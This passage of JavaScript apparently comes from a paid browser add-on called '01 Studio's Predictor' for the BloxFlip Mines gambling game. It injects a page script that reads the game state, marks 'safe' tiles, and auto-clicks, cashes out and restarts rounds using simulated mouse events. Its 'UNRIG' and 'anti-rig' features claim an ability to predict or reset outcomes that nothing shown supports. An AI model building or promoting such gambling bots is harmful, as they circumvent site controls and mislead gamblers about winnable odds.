 for (var ii = 0; ii < textInputs.length; ii++) {
 var inp = textInputs[ii];
 var ggp = inp.parentElement && inp.parentElement.parentElement && inp.parentElement.parentElement.parentElement;
 if (ggp && ggp.innerText && ggp.innerText.indexOf('Total earnings') !== -1) {
 var pval = parseFloat(inp.value);
 if (!isNaN(pval) && pval > 0.95) { payoutAmount = pval; }
 break;
 }
 }
 var btns = document.querySelectorAll('button');
 for (var bi = 0; bi < btns.length; bi++) {
 if (/cashout/i.test(btns[bi].textContent)) {
 var mMatch = btns[bi].textContent.match(/([\d.]+)\s*x/i);
 if (mMatch) { domMult = parseFloat(mMatch[1]); }
 break;
 }
 }
 if (domMult > 0.94) _cachedMult = domMult;
 } catch(e3) {}

 window.postMessage({ type: '__01studios_state', payload: { game: _cachedGame, multiplier: _cachedMult, payoutAmount: payoutAmount }}, '*');
 }

 setInterval(poll, 150);
 poll();

 function fireClick(el) {
 var rect = el.getBoundingClientRect();
 var cx = rect.left + rect.width / 2;
 var cy = rect.top + rect.height / 2;
 var pOpts = { bubbles: true, cancelable: true, view: window, clientX: cx, clientY: cy,
 screenX: cx, screenY: cy, pointerId: 1, pointerType: 'mouse', isPrimary: true };
 var mOpts = { bubbles: true, cancelable: true, view: window, clientX: cx, clientY: cy };
 el.dispatchEvent(new PointerEvent('pointerover', pOpts));
 el.dispatchEvent(new PointerEvent('pointerenter', Object.assign({}, pOpts, { bubbles: false })));
 el.dispatchEvent(new MouseEvent('mouseover', mOpts));
 el.dispatchEvent(new MouseEvent('mouseenter', Object.assign({}, mOpts, { bubbles: false })));
 el.dispatchEvent(new PointerEvent('pointermove', pOpts));
 el.dispatchEvent(new MouseEvent('mousemove', mOpts));
 el.dispatchEvent(new PointerEvent('pointerdown', pOpts));
 el.dispatchEvent(new MouseEvent('mousedown', Object.assign({}, mOpts, { button: 0, buttons: 1 })));
 el.dispatchEvent(new PointerEvent('pointerup', pOpts));
 el.dispatchEvent(new MouseEvent('mouseup', Object.assign({}, mOpts, { button: 0, buttons: 0 })));
 el.dispatchEvent(new MouseEvent('click', Object.assign({}, mOpts, { button: 0, buttons: 0 })));
 }

 window.addEventListener('message', function(e) {
 if (!e.data) return;

 if (e.data.type === '__01studios_click') {
 var idx = e.data.idx;
 var tile = document.querySelector('[aria-label="Open mine ' + idx + '"]');
 if (tile) fireClick(tile);
 return;
 }

 if (e.data.type === '__01studios_cashout') {
 var btns = document.querySelectorAll('button');
 var cashBtn = null;
 for (var i = 0; i < btns.length; i++) {
 if (btns[i].textContent && btns[i].textContent.toLowerCase().indexOf('cashout') !== -1) {
 cashBtn = btns[i];
 break;
 }
 }
 if (cashBtn) fireClick(cashBtn);
 return;
 }

 if (e.data.type === '__01studios_start') {
 var allBtns = document.querySelectorAll('button');
 var startBtn = null;
 for (var j = 0; j < allBtns.length; j++) {
 var txt = allBtns[j].textContent ? allBtns[j].textContent.trim().toLowerCase() : '';
 if (txt === 'start new game' || txt === 'play again' || txt === 'start game') {
 startBtn = allBtns[j];
 break;
 }
 }
 if (startBtn) fireClick(startBtn);
 return;
 }
 });
})();
 `;
 (document.head || document.documentElement).appendChild(script);
 script.remove();
 }

 function getGameState() { return _latestGameState; }

 function getTileByIndex(idx) {
 return document.querySelector(`[aria-label="Open mine ${idx + 1}"]`);
 }

 function clickBloxFlipTile(zeroBasedIdx) {
 const oneBased = zeroBasedIdx + 1;
 window.postMessage({ type: '__01studios_click', idx: oneBased }, '*');
 return true;
 }

 function updateBoardOverlay(retryCount) {
 document.querySelectorAll('._01studios_overlay_marker').forEach(el => el.remove());
 if (!prediction || prediction.length === 0) return;

 const testTile = document.querySelector('[aria-label="Open mine 1"]');
 if (!testTile) {
 if ((retryCount||0) < 20) setTimeout(() => updateBoardOverlay((retryCount||0)+1), 300);
 return;
 }
 const testRect = testTile.getBoundingClientRect();
 if (testRect.width === 0 || testRect.height === 0) {
 if ((retryCount||0) < 20) setTimeout(() => updateBoardOverlay((retryCount||0)+1), 300);
 return;
 }

 const tileW = testRect.width;
 const fontSize = tileW > 60 ? 14 : 11;
 const badgeSize = tileW > 60 ? 22 : 18;

 const safePicks = prediction.filter(p => p && p.isSuggestedSafe).sort((a, b) => a.pickOrder - b.pickOrder);
 safePicks.forEach(p => {
 const btn = getTileByIndex(p.index);
 if (!btn) return;
 btn.style.position = 'relative';
 const marker = document.createElement('div');
 marker.className = '_01studios_overlay_marker';
 marker.dataset.tileIndex = p.index;
 const pc = getPredColor();
 marker.style.cssText = `position:absolute;inset:0;z-index:9999;pointer-events:none;border-radius:10px;border:2px solid ${pc};box-shadow:0 0 20px ${pc}88,inset 0 0 14px ${pc}22;background:#0a0a0aee;display:flex;align-items:center;justify-content:center;animation:_01studios_breathe 2s ease-in-out infinite;`;
 const imgSize = Math.min(tileW * 0.65, 48);
 const mascot = document.createElement('img');
 mascot.src = _01_LOGO;
 mascot.style.cssText = `width:${imgSize}px;height:${imgSize}px;object-fit:contain;pointer-events:none;filter:drop-shadow(0 0 6px ${pc}88);animation:_01studios_mascot_pulse 2s ease-in-out infinite;`;
 const orderBadge = document.createElement('div');
 orderBadge.style.cssText = `position:absolute;top:3px;right:3px;background:${pc};color:#000;font-size:9px;font-weight:900;width:16px;height:16px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif;box-shadow:0 1px 4px rgba(0,0,0,0.6);pointer-events:none;`;
 orderBadge.textContent = p.pickOrder;
 marker.appendChild(mascot);
 marker.appendChild(orderBadge);
 btn.appendChild(marker);
 });

 prediction.filter(p => p && p.isRevealed && p.isSafe).forEach(p => {
 const btn = getTileByIndex(p.index);
 if (!btn) return;
 btn.style.position = 'relative';
 const marker = document.createElement('div');
 marker.className = '_01studios_overlay_marker';
 marker.style.cssText = `position:absolute;inset:0;z-index:9999;pointer-events:none;border-radius:10px;border:2px solid #00c97a;box-shadow:0 0 10px #00c97a44;background:#00c97a10;display:flex;align-items:center;justify-content:center;font-size:${tileW>60?18:14}px;color:#00c97a;font-weight:900;`;
 marker.textContent = '✓';
 btn.appendChild(marker);
 });
 }

 function injectOverlayStyles() {
 let style = document.getElementById('_01studios_overlay_styles');
 if (!style) {
 style = document.createElement('style');
 style.id = '_01studios_overlay_styles';
 document.head.appendChild(style);
 }
 const pc = getPredColor();
 style.textContent = `
 @keyframes _01studios_breathe {
 0%, 100% {
 box-shadow: 0 0 14px ${pc}66, inset 0 0 10px ${pc}18;
 border-color: ${pc}aa;
 transform: scale(1);
 }
 50% {
 box-shadow: 0 0 28px ${pc}cc, inset 0 0 22px ${pc}33;
 border-color: ${pc};
 transform: scale(1.03);
 }
 }
 @keyframes _01studios_mascot_pulse {
 0%, 100% {
 transform: scale(1);
 filter: drop-shadow(0 0 4px ${pc}66);
 }
 50% {
 transform: scale(1.1);
 filter: drop-shadow(0 0 10px ${pc}cc);
 }
 }
 `;
 }

 function clearBoardOverlay() {
 document.querySelectorAll('._01studios_overlay_marker').forEach(el => el.remove());
 }

 function applyAccentColor() {
 const ac = accentColor;
 const pc = getPredColor();

 injectOverlayStyles();

 clearBoardOverlay();
 if (prediction && prediction.length > 0) updateBoardOverlay(0);

 updateAutoPressBtn();
 updateAutoCashoutBtn();
 updateAutoStartBtn();

 updateModeButtons();
 updateTileButtons();
 updateGridSizeButtons();

 const panel = document.getElementById('_01studios_panel');
 if (panel) panel.style.boxShadow = `0 8px 40px rgba(0,0,0,0.8),0 0 0 1px ${ac}14`;

 const badge = document.getElementById('_01studios_live_badge');
 if (badge) { badge.style.background = `${ac}22`; badge.style.borderColor = `${ac}66`; badge.style.color = ac; }

 const streak = document.getElementById('_01studios_streak');
 if (streak && streak.style.color !== '#00c97a' && streak.style.color !== '#e05555') streak.style.color = ac;
 const mult = document.getElementById('_01studios_mult');
 if (mult) mult.style.color = ac;

 updateGrid();
 }

 let autoPressEnabled = false;
 let autoPressActive = false;
 let _minesSequenceLock = false;
 let _minesSequenceComplete = false;

 function updateAutoPressBtn() {
 const btn = document.getElementById('_01studios_autopress');
 if (!btn) return;
 const ac = accentColor;
 if (autoPressEnabled) {
 btn.textContent = '⏹ AUTO ON';
 btn.style.borderColor = ac;
 btn.style.color = ac;
 btn.style.background = `linear-gradient(135deg,${ac}22,${ac}44)`;
 } else {
 btn.textContent = 'AUTO CLICK';
 btn.style.borderColor = '#333';
 btn.style.color = TEXT_DIM;
 btn.style.background = '#1a1a1a';
 }
 }

 let _lastMinesUUID = null;
 let _lastMinesRevealed = 0;
 let _minesTargetLock = [];

 function runAutoPress() {
 if (autoPressActive) return;
 if (!gameRunning || !currentGameData) return;

 _minesTargetLock = prediction
 .filter(p => p && p.isSuggestedSafe && !p.isRevealed)
 .sort((a, b) => a.pickOrder - b.pickOrder)
 .map(p => p.index);

 if (_minesTargetLock.length === 0) return;

 const revealedCount = (currentGameData.uncoveredLocations || []).length;
 const total = gridSize * gridSize;

 if (autoCashoutEnabled && revealedCount >= targetTiles) {
 setTimeout(performAutoCashout, 400);
 return;
 }

 autoPressActive = true;
 _minesSequenceLock = true;
 _minesSequenceComplete = false;
 updateStatus(` Auto pressing ${_minesTargetLock.length} tiles...`, accentColor);

 let i = 0;
 _lastMinesUUID = currentGameData.uuid;
 _lastMinesRevealed = revealedCount;

 function pressNext() {
 if (!autoPressActive || !autoPressEnabled || !gameRunning || !currentGameData || currentGameData.uuid !== _lastMinesUUID) {
 autoPressActive = false;
 _minesSequenceLock = false;
 _minesSequenceComplete = false;
 return;
 }

 const currentRevealed = (currentGameData.uncoveredLocations || []).length;

 if (i > 0 && currentRevealed <= _lastMinesRevealed) {
 setTimeout(pressNext, 100);
 return;
 }

 if (i >= _minesTargetLock.length) {
 autoPressActive = false;
 _minesSequenceLock = false;
 _minesSequenceComplete = true;
 if (autoCashoutEnabled) {
 updateStatus(`OK All ${_minesTargetLock.length} tiles clicked — cashing out...`, '#00c97a');
 setTimeout(performAutoCashout, 400);
 } else {
 updateStatus(`OK All ${_minesTargetLock.length} tiles clicked — waiting for cashout...`, '#00c97a');
 }
 return;
 }

 if (autoCashoutEnabled && currentRevealed >= targetTiles) {
 autoPressActive = false;
 _minesSequenceLock = false;
 _minesSequenceComplete = true;
 updateStatus(`OK Target reached (${currentRevealed}/${targetTiles} tiles) — cashing out...`, '#00c97a');
 setTimeout(performAutoCashout, 400);
 return;
 }

 const tileIdx = _minesTargetLock[i];
 _lastMinesRevealed = currentRevealed;

 clickBloxFlipTile(tileIdx);
 updateStatus(` Clicking tile ${i + 1}/${_minesTargetLock.length}...`, accentColor);
 i++;

 const delay = 550 + Math.random() * 300;
 setTimeout(pressNext, delay);
 }
 pressNext();
 }

 function autoPressTiles() {
 autoPressEnabled = !autoPressEnabled;
 if (!autoPressEnabled) {
 autoPressActive = false;
 updateStatus('Auto click off.', TEXT_DIM);
 } else {
 updateStatus(' Auto click ON — will fire on next prediction.', accentColor);
 if (gameRunning && prediction.some(p => p && p.isSuggestedSafe && !p.isRevealed)) {
 runAutoPress();
 }
 }
 updateAutoPressBtn();
 }

 let autoCashoutEnabled = false;

 function updateAutoCashoutBtn() {
 const btn = document.getElementById('_01studios_autocashout');
 if (!btn) return;
 if (autoCashoutEnabled) {
 btn.textContent = '⏹ CASHOUT ON';
 btn.style.borderColor = '#00c97a';
 btn.style.color = '#00c97a';
 btn.style.background = 'linear-gradient(135deg,#00c97a22,#00c97a44)';
 } else {
 btn.textContent = 'AUTO CASHOUT';
 btn.style.borderColor = '#333';
 btn.style.color = TEXT_DIM;
 btn.style.background = '#1a1a1a';
 }
 }

 function performAutoCashout() {
 window.postMessage({ type: '__01studios_cashout' }, '*');
 }

 function toggleAutoCashout() {
 autoCashoutEnabled = !autoCashoutEnabled;
 if (autoCashoutEnabled) {
 updateStatus(' Auto cashout ON — will cashout after target tiles.', '#00c97a');
 } else {
 updateStatus('Auto cashout off.', TEXT_DIM);
 }
 updateAutoCashoutBtn();
 }

 let autoStartEnabled = false;

 function updateAutoStartBtn() {
 const btn = document.getElementById('_01studios_autostart');
 if (!btn) return;
 if (autoStartEnabled) {
 btn.textContent = '⏹ START ON';
 btn.style.borderColor = '#00c97a';
 btn.style.color = '#00c97a';
 btn.style.background = 'linear-gradient(135deg,#00c97a22,#00c97a44)';
 } else {
 btn.textContent = 'AUTO START';
 btn.style.borderColor = '#333';
 btn.style.color = TEXT_DIM;
 btn.style.background = '#1a1a1a';
 }
 }

 function performAutoStart() {
 window.postMessage({ type: '__01studios_start' }, '*');
 }

 function toggleAutoStart() {
 autoStartEnabled = !autoStartEnabled;
 if (autoStartEnabled) {
 updateStatus(' Auto start ON — will start new game after each round.', '#00c97a');
 } else {
 updateStatus('Auto start off.', TEXT_DIM);
 }
 updateAutoStartBtn();
 }

 function cleanStaleOverlayMarkers() {
 const suggestedIndices = new Set(
 prediction.filter(p => p && p.isSuggestedSafe).map(p => p.index)
 );
 document.querySelectorAll('._01studios_overlay_marker').forEach(el => {
 const idx = parseInt(el.dataset.tileIndex, 10);
 if (!isNaN(idx) && !suggestedIndices.has(idx)) el.remove();
 });
 }

 function readMineCount() {
 const state = getGameState();
 if (state && state.game && state.game.minesAmount) return state.game.minesAmount;
 const inp = document.querySelector('[class*="gameBet"] input[type="text"]');
 if (inp) { const v = parseInt(inp.value); if (!isNaN(v) && v >= 1 && v <= 24) return v; }
 return mineCount;
 }

 const MODES = [
 { id:'smart', icon:'', label:'Smart Mode', sub:'Best of all modes' },
 { id:'safe', icon:'', label:'Low Risk', sub:'Conservative plays' },
 { id:'aggressive', icon:'', label:'High Risk', sub:'Max reward plays' },
 { id:'martingale', icon:'', label:'Unrigged', sub:'Anti-rig strategy' },
 ];

 function getLicenseBadge() { return ''; }

 const WHEEL_ITEMS = [
 { action: 'unrig', icon: '', label: 'UNRIG', sub: 'Reset seed', color: '#e05555' },
 { action: 'algo', icon: '', label: 'ALGOS', sub: 'Select mode', color: '#ffffff' },
 { action: 'settings', icon: '', label: 'SETTINGS', sub: 'Configure', color: '#fff' },
 { action: 'analytics', icon: '', label: 'LOGS', sub: 'History', color: '#fff' },
 { action: 'heatmap', icon: '', label: 'HEATMAP', sub: 'Mine zones', color: '#ff7043' },
 { action: 'license', icon: '', label: 'LICENSE', sub: 'Key info', color: '#f5c518' }
 ];

 function injectRadialStyles() {
 const id = '_01studios_radial_styles';
 let style = document.getElementById(id);
 if (!style) {
 style = document.createElement('style');
 style.id = id;
 document.head.appendChild(style);
 }
 style.textContent = `
 #_01studios_radial_overlay {
 position: fixed; inset: 0; background: rgba(0,0,0,0.75);
 backdrop-filter: blur(18px) contrast(1.1); -webkit-backdrop-filter: blur(18px) contrast(1.1);
 z-index: 2147483648; display: none; align-items: center; justify-content: center;
 transition: opacity 0.4s cubic-bezier(0.4, 0, 0.2, 1); opacity: 0;
 }
 #_01studios_radial_overlay.open { display: flex; opacity: 1; }

 @keyframes _01studios_pulse_glow {
 0% { box-shadow: 0 0 40px ${accentColor}44, inset 0 0 20px ${accentColor}22; border-color: ${accentColor}88; }
 50% { box-shadow: 0 0 70px ${accentColor}88, inset 0 0 40px ${accentColor}44; border-color: ${accentColor}; }
 100% { box-shadow: 0 0 40px ${accentColor}44, inset 0 0 20px ${accentColor}22; border-color: ${accentColor}88; }
 }

 @keyframes _01studios_logo_spin {
 0% { transform: scale(1); filter: drop-shadow(0 0 15px ${accentColor}66); }
 50% { transform: scale(1.05); filter: drop-shadow(0 0 30px ${accentColor}); }
 100% { transform: scale(1); filter: drop-shadow(0 0 15px ${accentColor}66); }
 }

 .radial-wheel {
 position: relative; width: 520px; height: 520px;
 border-radius: 50%; display: flex; align-items: center; justify-content: center;
 overflow: visible; perspective: 1000px;
 }

 .radial-segment {
 position: absolute; width: 260px; height: 260px;
 top: 0; right: 0; transform-origin: 0% 100%;
 background: linear-gradient(135deg, rgba(25,25,25,0.9), rgba(15,15,15,0.95));
 border: 1px solid rgba(255,255,255,0.05);
 transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); cursor: pointer;
 clip-path: polygon(0 100%, 0 0, 100% 0, 100% 100%);
 z-index: 2;
 }

 .radial-segment:hover {
 background: linear-gradient(135deg, rgba(45,45,45,0.95), rgba(30,30,30,1));
 border-color: ${accentColor}aa;
 z-index: 5;
 transform: scale(1.1) rotate(var(--rotation)) skewY(var(--skew));
 box-shadow: 0 0 40px ${accentColor}55;
 }

 .radial-content {
 position: absolute; transform: translate(-50%, -50%);
 text-align: center; pointer-events: none; width: 150px;
 z-index: 6; transition: all 0.3s ease;
 }

 .radial-segment:hover + .radial-content {
 transform: translate(-50%, -50%) scale(1.15);
 }

 .radial-center {
 position: absolute; width: 170px; height: 170px;
 background: #000; border: 3px solid ${accentColor}88;
 border-radius: 50%; z-index: 10; display: flex;
 align-items: center; justify-content: center;
 animation: _01studios_pulse_glow 3s infinite ease-in-out;
 overflow: visible;
 }

 .radial-center img {
 width: 110%; height: 110%; object-fit: contain;
 animation: _01studios_logo_spin 4s infinite ease-in-out;
 pointer-events: none;
 }

 .radial-vip-tag {
 position: absolute; bottom: -25px; left: 50%; transform: translateX(-50%);
 background: ${accentColor}; color: #000; font-size: 9px; font-weight: 900;
 padding: 2px 10px; border-radius: 4px; letter-spacing: 2px;
 box-shadow: 0 0 15px ${accentColor}aa; text-transform: uppercase;
 }
 `;
 }

 function renderRadialWheel() {
 let overlay = document.getElementById('_01studios_radial_overlay');
 if (!overlay) {
 overlay = document.createElement('div');
 overlay.id = '_01studios_radial_overlay';
 document.body.appendChild(overlay);
 }

 const wheel = document.createElement('div');
 wheel.className = 'radial-wheel';

 const count = WHEEL_ITEMS.length;
 const angleStep = 360 / count;
 const skewAngle = 90 - angleStep;

 WHEEL_ITEMS.forEach((item, i) => {
 const rotation = i * angleStep;
 const segment = document.createElement('div');
 segment.className = 'radial-segment';
 segment.style.setProperty('--rotation', `${rotation}deg`);
 segment.style.setProperty('--skew', `-${skewAngle}deg`);
 segment.style.transform = `rotate(${rotation}deg) skewY(-${skewAngle}deg)`;

 segment.onclick = (e) => {
 e.stopPropagation();
 closeRadial();
 openModal(item.action);
 };

 const midAngle = (rotation + angleStep / 2) * (Math.PI / 180);
 const radius = 185;
 const x = 260 + Math.sin(midAngle) * radius;
 const y = 260 - Math.cos(midAngle) * radius;

 const content = document.createElement('div');
 content.className = 'radial-content';
 content.style.left = `${x}px`;
 content.style.top = `${y}px`;
 content.innerHTML = `
 ${item.icon ? `<div style="font-size:40px;margin-bottom:10px;filter:drop-shadow(0 0 10px ${accentColor}44);">${item.icon}</div>` : ""}
 <div style="color:${item.color};font-size:15px;font-weight:900;letter-spacing:2px;text-shadow:0 0 15px ${accentColor}66;">${item.label}</div>
 <div style="color:#888;font-size:10px;margin-top:4px;font-weight:700;letter-spacing:1px;">${item.sub}</div>
 `;

 wheel.appendChild(segment);
 wheel.appendChild(content);
 });

 const center = document.createElement('div');
 center.className = 'radial-center';
 center.innerHTML = `
 <img src="${_01_LOGO}" alt="Logo">
 <div class="radial-vip-tag">PREMIUM</div>
 `;

 wheel.appendChild(center);
 overlay.innerHTML = '';
 overlay.appendChild(wheel);
 overlay.onclick = closeRadial;
 }

 function openRadial() {
 injectRadialStyles();
 renderRadialWheel();
 const overlay = document.getElementById('_01studios_radial_overlay');
 if (overlay) {
 overlay.style.display = 'flex';
 setTimeout(() => overlay.classList.add('open'), 10);
 }
 }

 function closeRadial() {
 const overlay = document.getElementById('_01studios_radial_overlay');
 if (overlay) {
 overlay.classList.remove('open');
 setTimeout(() => overlay.style.display = 'none', 300);
 }
 }

 function injectMainStyles() {
 const id = '_01studios_main_styles';
 let style = document.getElementById(id);
 if (!style) {
 style = document.createElement('style');
 style.id = id;
 document.head.appendChild(style);
 }
 style.textContent = `
 @keyframes _01studios_panel_glow {
 0% { box-shadow: 0 8px 40px rgba(0,0,0,0.8), 0 0 15px ${accentColor}22; border-color: ${CARD_BORDER}; }
 50% { box-shadow: 0 8px 50px rgba(0,0,0,0.9), 0 0 30px ${accentColor}44; border-color: ${accentColor}44; }
 100% { box-shadow: 0 8px 40px rgba(0,0,0,0.8), 0 0 15px ${accentColor}22; border-color: ${CARD_BORDER}; }
 }

 #_01studios_panel {
 animation: _01studios_panel_glow 4s infinite ease-in-out;
 transition: border-color 0.3s ease, box-shadow 0.3s ease;
 }

 ._01studios_mode_btn {
 transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1) !important;
 }

 ._01studios_mode_btn[style*="border: 1.5px solid ${accentColor}"] {
 box-shadow: 0 0 15px ${accentColor}33, inset 0 0 10px ${accentColor}11;
 background: linear-gradient(135deg, ${accentColor}11, ${accentColor}22) !important;
 }

 ._01studios_mode_btn:hover {
 border-color: ${accentColor}88 !important;
 box-shadow: 0 0 20px ${accentColor}22;
 transform: translateY(-2px);
 }

 #_01studios_autopress, #_01studios_autocashout, #_01studios_autostart {
 transition: all 0.3s ease !important;
 }

 #_01studios_autopress:hover, #_01studios_autocashout:hover, #_01studios_autostart:hover {
 filter: brightness(1.2) drop-shadow(0 0 8px ${accentColor}66);
 transform: translateY(-1px);
 }

 .grid-cell-glow {
 transition: all 0.2s ease;
 }
 .grid-cell-glow:hover {
 box-shadow: 0 0 15px ${accentColor}aa;
 transform: scale(1.05);
 z-index: 10;
 }

 .active-glow {
 box-shadow: 0 0 15px ${accentColor}66 !important;
 text-shadow: 0 0 8px ${accentColor}aa;
 }
 `;
 }

 function buildGUI() {
 const existing = document.getElementById('_01studios_panel');
 if (existing) existing.remove();
 const pos = getSavedPos();
 const panel = document.createElement('div');
 panel.id = '_01studios_panel';
 panel.style.cssText = `position:fixed;left:${pos?pos.x:20}px;top:${pos?pos.y:80}px;width:560px;background:${DARK_BG};border:1px solid ${CARD_BORDER};border-radius:14px;font-family:'Segoe UI',system-ui,sans-serif;color:${TEXT_MAIN};z-index:2147483647;box-shadow:0 8px 40px rgba(0,0,0,0.8),0 0 0 1px ${accentColor}14;user-select:none;overflow:hidden;`;
 panel.innerHTML = renderPanel();
 document.body.appendChild(panel);
 injectMainStyles();
 attachEvents(panel);
 return panel;
 }

 function renderPanel() {
 return `${renderHeader()}${panelMinimized ? '' : `<div id="_01studios_body" style="padding:0 14px 14px;">${renderStatusBar()}<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:4px;"><div>${renderModeSection()}${renderSafeTilesSection()}${renderSessionSection()}${renderRainSection()}</div><div>${renderGridSection()}${renderStrategyBar()}</div></div>${renderFooterBar()}</div>`}`;
 }

 function renderHeader() {
 return `
 <div id="_01studios_header" style="display:flex;align-items:center;justify-content:space-between;padding:8px 14px;cursor:move;border-bottom:1px solid ${CARD_BORDER};background:linear-gradient(180deg,${DARK_BG} 0%,#0d0d0d 100%);">
 <div style="display:flex;align-items:center;gap:8px;">
 <img src="${_01_LOGO}" style="width:28px;height:28px;border-radius:6px;object-fit:cover;">
 <div style="display:flex;flex-direction:column;line-height:1;">
 <span style="font-size:14px;font-weight:800;letter-spacing:1.5px;color:${accentColor};text-transform:uppercase;">01 Studio's</span>
 <span style="font-size:8px;color:#444;font-weight:600;letter-spacing:2px;margin-top:1px;">PREDICTOR v${VERSION}</span>
 </div>
 ${getLicenseBadge()}
 <div id="_01studios_live_badge" style="display:none;background:${accentColor}22;border:1px solid ${accentColor}66;color:${accentColor};font-size:8px;font-weight:700;padding:2px 7px;border-radius:20px;letter-spacing:1px;">LIVE</div>
 </div>
 <div style="display:flex;align-items:center;gap:8px;position:relative;">
 <div id="_01studios_wheel_wrap" style="position:relative;">
 <button id="_01studios_menu_btn" title="Menu" style="background:linear-gradient(135deg,${accentColor}22,${accentColor}44);border:1.5px solid ${accentColor};color:${accentColor};height:32px;padding:0 12px;border-radius:8px;cursor:pointer;font-size:10px;font-weight:700;letter-spacing:2px;display:flex;align-items:center;gap:5px;"><span style="font-size:13px;">=</span> MENU</button>
 <div id="_01studios_wheel_popup" style="display:none;position:absolute;top:40px;right:0;background:#111;border:1px solid #333;border-radius:14px;padding:8px;z-index:2147483648;box-shadow:0 8px 32px rgba(0,0,0,0.9);min-width:160px;">
 <div class="_01studios_wheel_item" data-action="unrig" style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:9px;cursor:pointer;border:1px solid transparent;">
 <div><div style="color:#e05555;font-size:11px;font-weight:700;letter-spacing:1px;">UNRIG</div><div style="color:#444;font-size:9px;">Reset client seed</div></div>
 </div>
 <div class="_01studios_wheel_item" data-action="algo" style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:9px;cursor:pointer;border:1px solid transparent;">
 <div><div style="color:${accentColor};font-size:11px;font-weight:700;letter-spacing:1px;">ALGORITHMS</div><div style="color:#444;font-size:9px;">Select prediction algos</div></div>
 </div>
 <div class="_01studios_wheel_item" data-action="settings" style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:9px;cursor:pointer;border:1px solid transparent;">
 <div><div style="color:${TEXT_MAIN};font-size:11px;font-weight:700;letter-spacing:1px;">SETTINGS</div><div style="color:#444;font-size:9px;">Configure behaviour</div></div>
 </div>
 <div class="_01studios_wheel_item" data-action="analytics" style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:9px;cursor:pointer;border:1px solid transparent;">
 <div><div style="color:${TEXT_MAIN};font-size:11px;font-weight:700;letter-spacing:1px;">SESSION LOG</div><div style="color:#444;font-size:9px;">View game history</div></div>
 </div>
 <div class="_01studios_wheel_item" data-action="heatmap" style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:9px;cursor:pointer;border:1px solid transparent;">
 <div><div style="color:#ff7043;font-size:11px;font-weight:700;letter-spacing:1px;">HEATMAP</div><div style="color:#444;font-size:9px;">Mine frequency map</div></div>
 </div>
 <div class="_01studios_wheel_item" data-action="license" style="display:flex;align-items:center;gap:10px;padding:9px 12px;border-radius:9px;cursor:pointer;border:1px solid transparent;">
 <div><div style="color:${TEXT_MAIN};font-size:11px;font-weight:700;letter-spacing:1px;">LICENSE</div><div style="color:#444;font-size:9px;">Key &amp; expiry info</div></div>
 </div>
 </div>
 </div>
 <button id="_01studios_minimize" style="background:#2a2a2a;border:1px solid #333;color:${TEXT_DIM};width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:16px;display:flex;align-items:center;justify-content:center;">−</button>
 </div>
 </div>`;
 }

 function renderStatusBar() {
 return `<div id="_01studios_status_bar" style="display:grid;grid-template-columns:repeat(5,1fr);gap:6px;margin:10px 0 8px;">${[{id:'_01studios_wins',label:'WINS',val:'0',color:'#00c97a'},{id:'_01studios_losses',label:'LOSSES',val:'0',color:'#e05555'},{id:'_01studios_streak',label:'STREAK',val:'0',color:accentColor},{id:'_01studios_mult',label:'MULT',val:'—',color:accentColor},{id:'_01studios_profit',label:'PROFIT',val:'+0.0',color:'#00c97a'}].map(s=>`<div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:10px;padding:8px;text-align:center;"><div style="color:${TEXT_DIM};font-size:9px;letter-spacing:1px;margin-bottom:3px;">${s.label}</div><div id="${s.id}" style="color:${s.color};font-size:15px;font-weight:700;">${s.val}</div></div>`).join('')}</div>`;
 }

 function renderModeSection() {
 return `<div style="margin-bottom:10px;"><div style="color:${TEXT_DIM};font-size:10px;letter-spacing:2px;font-weight:600;margin-bottom:8px;">Prediction Mode</div><div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">${MODES.map(m=>{const active=m.id===currentMode;return`<button class="_01studios_mode_btn" data-mode="${m.id}" style="background:${active?accentColor+'22':CARD_BG};border:1.5px solid ${active?accentColor:CARD_BORDER};border-radius:12px;padding:12px 10px;cursor:pointer;text-align:center;">${m.icon ? '<div style="font-size:18px;margin-bottom:5px;color:'+(active?accentColor:TEXT_DIM)+';">'+m.icon+'</div>' : ''}<div style="font-size:12px;font-weight:700;color:${active?accentColor:TEXT_MAIN};${m.icon?'':'padding:8px 0'}">${m.label}</div></button>`;}).join('')}</div></div>`;
 }

 function renderSafeTilesSection() {
 const optimal = findOptimalCashout(mineCount, gridSize * gridSize);
 const maxSafe = Math.max(1, gridSize * gridSize - mineCount);
 return `<div style="margin-bottom:10px;">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
 <div style="color:${TEXT_DIM};font-size:10px;letter-spacing:2px;font-weight:600;">Safe Tiles</div>
 <div style="color:${accentColor};font-size:9px;">optimal: ${optimal.tiles}</div>
 </div>
 <div style="display:flex;align-items:center;gap:8px;">
 <button id="_01studios_tile_dec" style="width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:16px;font-weight:700;background:#2a2a2a;border:1px solid #333;color:${TEXT_DIM};display:flex;align-items:center;justify-content:center;">−</button>
 <div style="flex:1;text-align:center;">
 <span id="_01studios_tile_count" style="color:${accentColor};font-size:22px;font-weight:800;">${targetTiles}</span>
 <span style="color:${TEXT_DIM};font-size:9px;margin-left:4px;">/ ${maxSafe}</span>
 </div>
 <button id="_01studios_tile_inc" style="width:32px;height:32px;border-radius:8px;cursor:pointer;font-size:16px;font-weight:700;background:#2a2a2a;border:1px solid #333;color:${TEXT_DIM};display:flex;align-items:center;justify-content:center;">+</button>
 </div>
 <div style="margin-top:6px;background:#111;border-radius:4px;height:4px;overflow:hidden;">
 <div id="_01studios_tile_bar" style="height:100%;width:${Math.round(targetTiles/maxSafe*100)}%;background:${accentColor};border-radius:4px;transition:width 0.2s;"></div>
 </div>
 </div>`;
 }

 function applyAnonMode(enabled) {
 if (_anonStyleEl) { _anonStyleEl.remove(); _anonStyleEl = null; }
 if (!enabled) return;
 const s = document.createElement('style');
 s.id = '_01studios_anon_css';
 s.textContent = `
 /* Hide usernames */
 [class*="username"], [class*="userName"], [class*="user-name"],
 [class*="UserName"], [class*="display-name"], [class*="displayName"],
